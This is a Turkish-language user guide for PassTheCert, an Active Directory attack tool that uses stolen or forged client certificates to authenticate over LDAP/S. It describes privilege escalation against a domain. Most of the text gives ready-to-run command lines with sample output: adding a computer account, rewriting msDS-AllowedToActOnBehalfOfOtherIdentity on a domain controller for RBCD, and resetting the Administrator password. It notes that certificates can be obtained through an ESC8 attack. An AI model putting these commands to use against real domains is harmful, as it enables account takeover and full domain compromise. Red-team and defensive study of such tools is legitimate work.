# PassTheCert Kullanım Kılavuzu

## Giriş
PassTheCert, Active Directory ortamlarında X.509 sertifikalarını kullanarak LDAP/S protokolleri aracılığıyla kimlik doğrulama ve saldırı gerçekleştirmek için kullanılan bir araçtır. PKINIT desteklenmediği durumlarda, bu araç saldırganların hedef sistemde yetki yükseltme işlemleri yapmasına olanak tanır.

PassTheCert, özellikle aşağıdaki saldırılar için tasarlanmıştır:
- **DCSync hakları verme**
- **Kaynak Tabanlı Kısıtlı Delegasyon (RBCD) saldırıları**
- **Etki alanına bilgisayar ekleme**
- **Kullanıcı parolasını sıfırlama**

---

## Gereksinimler
- Windows sistem veya C# çalıştırma desteği olan bir ortam
- Hedef sistemin LDAP/S portlarına erişim (TCP/389 veya TCP/636)
- Geçerli bir istemci sertifikası (örneğin, ESC8 saldırısıyla elde edilen bir sertifika)

---

## Özellikler
PassTheCert aşağıdaki işlemleri destekler:
- Sertifika ile LDAP kimlik doğrulaması
- LDAP protokolü üzerinden temel saldırı vektörleri
- StartTLS desteğiyle TCP/389 üzerinde çalışma

---

## Kullanım
### Komut Satırı Seçenekleri
- `--server`: Hedef LDAP sunucusu (örnek: `ad1.contoso.com`)
- `--cert-path`: Sertifika dosyasının yolu (örnek: `Z:\ad2.pfx`)
- `--add-computer`: Etki alanına yeni bir bilgisayar ekler
- `--rbcd`: Hedefin `msDS-AllowedToActOnBehalfOfOtherIdentity` özelliğini değiştirir
- `--reset-password`: Belirtilen hesabın parolasını sıfırlar

### Örnek Kullanımlar
#### 1. **Etki Alanına Yeni Bilgisayar Eklemek**
```bash
PassTheCert.exe --server ad1.contoso.com --cert-path Z:\ad2.pfx --add-computer --computer-name DESKTOP-1337$
```
- Bu komut, rastgele bir parola ile `DESKTOP-1337$` adında bir bilgisayar oluşturur.
- Çıktı örneği:
  ```
  No password given, generating random one.
  Generated password: Q2cpNOMhwlU2yZQBPAbJ1YY9M9XJIfBc
  Success
  ```

#### 2. **RBCD Saldırısı için msDS-AllowedToActOnBehalfOfOtherIdentity Değiştirme**
```bash
PassTheCert.exe --server ad1.contoso.com --cert-path Z:\ad2.pfx --rbcd --target "CN=AD2,OU=Domain Controllers,DC=contoso,DC=com" --sid "S-1-5-21-863927164-4106933278-53377030-3122"
```
- Bu komut, belirtilen hedef için `msDS-AllowedToActOnBehalfOfOtherIdentity` özelliğini günceller.
- Çıktı örneği:
  ```
  msDS-AllowedToActOnBehalfOfOtherIdentity attribute is empty
  You can clear it using arguments:
          --target "CN=AD2,OU=Domain Controllers,DC=contoso,DC=com" --restore clear
  Success
  ```

#### 3. **Kullanıcı Parolasını Sıfırlama**
```bash
PassTheCert.exe --server ad1.contoso.com --cert-path Z:\ad2.pfx --reset-password --target-user Administrator
```
- Bu komut, Administrator hesabının parolasını sıfırlar (gerekli izinlere sahip olmanız gerekir).

---

## Hata Ayıklama
Eğer PassTheCert çalıştırılırken hata alıyorsanız, aşağıdaki adımları kontrol edin:
1. **LDAP Portu**: Hedef sistemin TCP/389 veya TCP/636 portlarının açık olduğundan emin olun.
2. **Sertifika Geçerliliği**: Kullanılan sertifikanın geçerli ve hedef sistem tarafından kabul edildiğini doğrulayın.
3. **Yetki Eksikliği**: İşlemleri gerçekleştirmek için yeterli izinlere sahip bir hesap kullanın.

---

## Güvenlik Notları
Bu araç yalnızca güvenlik araştırmaları ve eğitim amaçlı kullanılmalıdır. Kötüye kullanım durumlarında etik ve yasal sorumluluk kullanıcıya aittir.

---

## İletişim
Bu araç hakkında daha fazla bilgi almak veya katkıda bulunmak için GitHub sayfasını ziyaret edebilirsiniz: [PassTheCert GitHub](https://github.com/YOUR-REPO/PASS-THE-CERT)
